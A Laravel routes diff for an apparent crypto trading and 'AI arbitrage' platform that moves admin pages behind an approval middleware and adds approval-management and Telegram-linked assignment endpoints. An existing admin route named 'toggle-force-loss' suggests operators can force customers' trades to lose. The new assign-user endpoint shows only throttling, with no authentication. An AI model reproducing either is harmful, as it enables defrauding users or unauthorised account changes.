@@ -12,11 +12,11 @@ Route::view('/', 'home');
 // Redirect any old /landing links to /info (keeps old links working)
 Route::redirect('/landing', '/info', 301);
 
-// Info landing page (marketing) - do not show to authenticated site users
+// Info landing page (marketing) - do not show to authenticated site users (but allow admins)
 Route::get('/info', function () {
     // If a user is logged in via the default web guard (i.e. exists in users table), don't show this page
-    if (Auth::check()) {
-        // Redirect regular authenticated users to the main portal
+    if (Auth::check() && !Auth::guard('admin')->check()) {
+        // Redirect regular authenticated users to the main portal (but allow admins to view /info)
         return redirect('/');
     }
 
@@ -26,8 +26,20 @@ Route::get('/info', function () {
 // Lightweight public price endpoint used by client UI to avoid exposing direct external API calls
 Route::get('/prices', [App\Http\Controllers\PriceController::class, 'prices'])->name('prices');
 
+// API: Contact admin about a plan (saves plan selection and notifies via Telegram)
+Route::post('/api/contact-admin', [App\Http\Controllers\PlanContactController::class, 'contactAdmin'])
+    ->middleware('auth:admin', 'throttle:10,1')
+    ->name('api.contact-admin');
+
 // Trade routes
 Route::get('/api/trade/{orderId}/price', [App\Http\Controllers\TradeController::class, 'getTradePrice']);
+
+// User Assignment API - Dashboard မှ
+Route::prefix('api/assignment')->group(function () {
+    Route::post('/assign-user', [App\Http\Controllers\TelegramWebhookController::class, 'assignUserFromTelegram'])
+        ->middleware('throttle:60,1')
+        ->name('assignment.assign-user');
+});
 
 // Admin Routes
 Route::prefix('admin')->name('admin.')->group(function () {
@@ -72,35 +84,40 @@ Route::prefix('admin')->name('admin.')->group(function () {
 
     // Protected admin routes (other pages)
     Route::middleware('auth:admin')->group(function () {
-        // User Management Routes
-        Route::controller(App\Http\Controllers\Admin\UserController::class)->prefix('users')->name('users.')->group(function () {
+        // User Management Routes (require approval)
+        Route::middleware('admin-approval')->controller(App\Http\Controllers\Admin\UserController::class)->prefix('users')->name('users.')->group(function () {
             Route::get('/', 'index')->name('index');
             Route::get('/{user}', 'show')->name('show');
             Route::post('/{user}/toggle-status', 'toggleStatus')->name('toggle-status');
             Route::post('/{user}/toggle-force-loss', 'toggleForceLoss')->name('toggle-force-loss');
         });
-        // Assign user to admin (super admin only) - handled by UsersManagementController
-        Route::post('/users/{user}/assign', [App\Http\Controllers\Admin\UsersManagementController::class, 'assign'])->name('users.assign');
+        // Assign user to admin (super admin only, requires approval) - handled by UsersManagementController
+        Route::middleware('admin-approval')->post('/users/{user}/assign', [App\Http\Controllers\Admin\UsersManagementController::class, 'assign'])->name('users.assign');
         
     Route::get('/profile', [App\Http\Controllers\Admin\ProfileController::class, 'index'])->name('profile');
     Route::post('/profile', [App\Http\Controllers\Admin\ProfileController::class, 'update'])->name('profile.update');
         
-        // Deposits Management
-        Route::get('/deposits', [App\Http\Controllers\Admin\DepositAdminController::class, 'index'])->name('deposits.index');
-        Route::post('/deposits/{deposit}/status', [App\Http\Controllers\Admin\DepositAdminController::class, 'updateStatus'])->name('deposits.update-status');
-    // Allow deleting a deposit (only allowed for super admins or assigned admin and only if not credited)
-    Route::delete('/deposits/{deposit}', [App\Http\Controllers\Admin\DepositAdminController::class, 'destroy'])->name('deposits.destroy');
+        // Deposits Management (require approval)
+        Route::middleware('admin-approval')->group(function () {
+            Route::get('/deposits', [App\Http\Controllers\Admin\DepositAdminController::class, 'index'])->name('deposits.index');
+            Route::post('/deposits/{deposit}/status', [App\Http\Controllers\Admin\DepositAdminController::class, 'updateStatus'])->name('deposits.update-status');
+            Route::delete('/deposits/{deposit}', [App\Http\Controllers\Admin\DepositAdminController::class, 'destroy'])->name('deposits.destroy');
+        });
         
-        // Withdrawals Management
-        Route::get('/withdraws', [App\Http\Controllers\Admin\WithdrawalAdminController::class, 'index'])->name('withdraws.index');
-        Route::post('/withdraws/{withdrawal}/status', [App\Http\Controllers\Admin\WithdrawalAdminController::class, 'updateStatus'])->name('withdraws.update-status');
-    Route::delete('/withdraws/{withdrawal}', [App\Http\Controllers\Admin\WithdrawalAdminController::class, 'destroy'])->name('withdraws.destroy');
+        // Withdrawals Management (require approval)
+        Route::middleware('admin-approval')->group(function () {
+            Route::get('/withdraws', [App\Http\Controllers\Admin\WithdrawalAdminController::class, 'index'])->name('withdraws.index');
+            Route::post('/withdraws/{withdrawal}/status', [App\Http\Controllers\Admin\WithdrawalAdminController::class, 'updateStatus'])->name('withdraws.update-status');
+            Route::delete('/withdraws/{withdrawal}', [App\Http\Controllers\Admin\WithdrawalAdminController::class, 'destroy'])->name('withdraws.destroy');
+        });
 
-        // Admin placeholders for Trading and AI Arbitrage pages (pages to be implemented later)
-    Route::get('/trading', [App\Http\Controllers\Admin\TradeOrderAdminController::class, 'index'])->name('trading.index');
-    Route::get('/trading/{trade}/edit', [App\Http\Controllers\Admin\TradeOrderAdminController::class, 'edit'])->name('trading.edit');
-    Route::post('/trading/{trade}/update', [App\Http\Controllers\Admin\TradeOrderAdminController::class, 'update'])->name('trading.update');
-    Route::delete('/trading/{trade}', [App\Http\Controllers\Admin\TradeOrderAdminController::class, 'destroy'])->name('trading.destroy');
+        // Admin placeholders for Trading and AI Arbitrage pages (pages to be implemented later, require approval)
+        Route::middleware('admin-approval')->group(function () {
+            Route::get('/trading', [App\Http\Controllers\Admin\TradeOrderAdminController::class, 'index'])->name('trading.index');
+            Route::get('/trading/{trade}/edit', [App\Http\Controllers\Admin\TradeOrderAdminController::class, 'edit'])->name('trading.edit');
+            Route::post('/trading/{trade}/update', [App\Http\Controllers\Admin\TradeOrderAdminController::class, 'update'])->name('trading.update');
+            Route::delete('/trading/{trade}', [App\Http\Controllers\Admin\TradeOrderAdminController::class, 'destroy'])->name('trading.destroy');
+        });
 
         Route::get('/ai-arbitrage', function() {
             // Admin AI arbitrage list (mirror trading admin list) and restrict to assigned users
@@ -122,10 +139,10 @@ Route::prefix('admin')->name('admin.')->group(function () {
 
             $plans = $plansQuery->paginate(20);
             return view('admin.ai_arbitrage', compact('plans'));
-        })->name('ai.arbitrage.index');
+        })->middleware('admin-approval')->name('ai.arbitrage.index');
 
         // JSON endpoint for a single plan (used by admin UI to fetch details)
-        Route::get('/ai-arbitrage/{id}/json', function ($id) {
+        Route::middleware('admin-approval')->get('/ai-arbitrage/{id}/json', function ($id) {
             if (!\Illuminate\Support\Facades\Schema::hasTable('ai_arbitrage_plans')) {
                 return response()->json(['success' => false, 'message' => 'ai_arbitrage_plans table not found'], 404);
             }
@@ -144,7 +161,7 @@ Route::prefix('admin')->name('admin.')->group(function () {
         })->name('ai.arbitrage.json');
 
         // Admin edit form for a plan
-        Route::get('/ai-arbitrage/{id}/edit', function ($id) {
+        Route::middleware('admin-approval')->get('/ai-arbitrage/{id}/edit', function ($id) {
             if (!\Illuminate\Support\Facades\Schema::hasTable('ai_arbitrage_plans')) {
                 return redirect()->route('admin.deposits.index');
             }
@@ -168,7 +185,7 @@ Route::prefix('admin')->name('admin.')->group(function () {
         })->name('ai.arbitrage.edit');
 
         // Update handler
-        Route::post('/ai-arbitrage/{id}/update', function (\Illuminate\Http\Request $request, $id) {
+        Route::middleware('admin-approval')->post('/ai-arbitrage/{id}/update', function (\Illuminate\Http\Request $request, $id) {
             if (!\Illuminate\Support\Facades\Schema::hasTable('ai_arbitrage_plans')) {
                 return redirect()->route('admin.deposits.index');
             }
@@ -314,7 +331,7 @@ Route::prefix('admin')->name('admin.')->group(function () {
         })->name('ai.arbitrage.update');
 
         // Delete handler
-        Route::delete('/ai-arbitrage/{id}', function ($id) {
+        Route::middleware('admin-approval')->delete('/ai-arbitrage/{id}', function ($id) {
             if (!\Illuminate\Support\Facades\Schema::hasTable('ai_arbitrage_plans')) {
                 return redirect()->route('admin.deposits.index');
             }
@@ -341,6 +358,16 @@ Route::prefix('admin')->name('admin.')->group(function () {
             return redirect()->route('admin.ai.arbitrage.index')->with('success', 'Plan deleted');
         })->name('ai.arbitrage.delete');
         
+        // Admin Approval Management Routes (Site Owner only)
+        Route::prefix('admin-approval')->name('admin_approval.')->group(function () {
+            Route::get('/', [App\Http\Controllers\Admin\AdminApprovalController::class, 'index'])->name('index');
+            Route::get('/{admin}', [App\Http\Controllers\Admin\AdminApprovalController::class, 'show'])->name('show');
+            Route::post('/{admin}/approve', [App\Http\Controllers\Admin\AdminApprovalController::class, 'approve'])->name('approve');
+            Route::post('/{admin}/reject', [App\Http\Controllers\Admin\AdminApprovalController::class, 'reject'])->name('reject');
+            Route::post('/{admin}/revoke', [App\Http\Controllers\Admin\AdminApprovalController::class, 'revoke'])->name('revoke');
+            Route::get('/status/json', [App\Http\Controllers\Admin\AdminApprovalController::class, 'statusJson'])->name('status.json');
+        });
+
         // Admin Management Routes
         Route::resource('admins', App\Http\Controllers\Admin\AdminController::class);
 
